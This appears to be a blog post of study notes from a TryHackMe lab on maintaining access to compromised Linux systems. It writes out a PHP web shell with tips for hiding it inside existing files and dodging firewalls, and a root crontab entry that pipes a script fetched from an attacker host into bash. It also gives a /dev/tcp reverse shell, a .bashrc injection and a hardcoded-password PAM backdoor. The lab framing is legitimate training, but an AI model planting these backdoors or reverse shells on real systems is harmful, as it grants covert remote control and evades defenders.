---
title: Linux Backdoors Beginner - Maintain access to a system
date: 2026-06-12 00:00:00 +0200
categories: [Linux]
tags: [linux, backdoors, persistence]
series: ""
series_order: 
---

> **Disclaimer**: This post contains my personal notes and methodology for the respective TryHackMe room. All the credits for the room and the lab environment go to the original creators at TryHackMe. **Flags are not revealed** to preserve the challenge for others. 
{: .prompt-info}

## Objective

> Learn about common linux backdoors. Not actual vulnerabilities, but different ways to maintain access to a system. 

---

## SSH backdoors

`ssh-keygen`, and leave the public key at `/root/.ssh` for example, or at a user's ssh directory. Rename the public key to **authorized_keys**. Now with our private key, we can always maintain access to the system, as long as the public key exists in that system. Give the private key **600** permissions (RW for the user). Use `ssh -i private_key root[@]IP`. 

> This is not a hidden backdoor. Quite obvious and visible. 
{: .prompt-info}

---

## PHP backdoors

If we get access to a linux host, we would usually search for credentials or useful information in the web root. The web root is located at `/var/www/html`. 

**Whatever you leave in the `/var/www/html` directory, will be accessible to everyone in their browser**. 

So, you can create a PHP file with any name, with the following code: 

```php
<?php
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }
?>
```

- You can pass any parameter (**named cmd**) with a GET or POST request, which will get executed by this piece of code. 
- If you leave the file at `/var/www/html/shell.php`, you could access it directly at `hxxp://ip/shell[.]php`
    - `hxxp://ip/shell[.]php?cmd=whoami`
    - If you want to perform a POST request, you could use `curl` for it (which can also be used for GET requests). `curl -x POST hxxp://ip/shell[.]php -d "cmd=id"`


Now, how to make this more hidden? 

1. Try to include this code in **existing PHP files**. More towards the middle of long PHP files. 
2. Change "cmd" to anything else. Web Application Firewalls (WAF) flag this very easily. So change it to something like `input` or `q` or `pass`. 

---

## Cronjob backdoors

Tasks that are scheduled to run at some time on a system. Located at `/etc/crontab`. 

You can add a crontab entry like this : `* *     * * *   root    curl ://<yourip>:8080/shell | bash`

- This would ensure the task runs every minute, every hour, every day etc. 
- Use `curl` to download a file from our attacker machine, to the remote victim machine. And execute it with `bash`, effectively, giving us a **reverse shell**. 

Our shell file would contain: 

```bash
#!/bin/bash

bash -i >& /dev/tcp/ip/port 0>&1
```

- The IP here should be our attacker machine's IP
- The `port` can be whatever we want. We have to ensure we are listening to the port with `nc -nvlp port`

We need to run a **HTTP server** serving the files at that port. You can do this with `python`: `python3 -m http.server 8080`

> Once again, not so hidden. If someone or something looks at `/etc/crontab`, it can easily find the entry. 
{: .prompt-info}


---

## .bashrc backdoors

If a user has `bash` as their login shell, the `.bashrc` in their home directory would get executed everytime an interactive session is launched. So we could modify that file to include a reverse shell as such: `echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc`. 

You need to have your `nc` listener listening to the port. 

> This could be considered sneaky, as once `.bashrc` is setup, no one really looks at that file. But if the monitoring is automated, and constantly checks for file changes, this could be caught pretty easily. 
{: .prompt-info}

---

## `pam_unix.so` backdoors

This file is one of the files responsible for authentication in Linux systems. 

`pam_unix.so` uses `unix_verify_password` function to verify user's supplied password. 

But, we could modify a file named `pam_unix_auth.c` and add something like `if (strcmp(p, "0xMitsurugi") != 0 )`, which will authenticate us if the user supplied password is `0xMitsurugi`, and if not, call the legitimate `unix_verify_password` function. 

We would have to **recompile** `pam_unix_auth.c` and replace `pam_unix.so` file. This can exist in different locations in different linux systems. Usually under `/usr/lib/<architecture>/security` directory


- For more information on this backdoor, visit [Creating backdoor in PAM blogpost](https://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html)
- To automate this process of creating a PAM backdoor, use this Github repository's resources: [GitHub linux-pam-backdoor](https://github.com/segmentati0nf4ult/linux-pam-backdoor)

---

## Further Resources

- [LinuxVox post](https://linuxvox.com/blog/linux-backdoor/#types-of-linux-backdoors)
- [9 ways to create a linux backdoor](https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c)

---
